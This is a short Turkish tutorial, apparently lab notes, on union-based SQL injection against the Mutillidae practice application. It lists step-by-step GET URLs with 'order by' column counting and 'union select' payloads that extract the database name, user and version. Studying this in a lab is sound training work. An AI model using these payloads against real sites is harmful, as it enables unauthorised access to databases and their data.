# SQL Get ile Veri Tabanı İsmini Öğrenme

#### 1. URL'kısmına ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' order by1%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
#### 2. ```order by 2``` diyerek tek tek deniyoruz ve kaç sütun olduğunu öğreniyoruz
#### 3. Kaç sütun olduğunu anlatıktan sonra (varsayalım 5 sütun var)
#### 4. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, 2, 3, 4, 5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazarak o sütundaki değerleri bastırıyoruz
#### 5. ```123.123.123.123/mutillidae/index.php?page=user-inho.php&username=admin' union select 1, database(), user(), version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details``` yazıyoruz
#### 6. Veritabanı ismini, kullanıcı adını ve linux versiyonunu öğreniyoruz
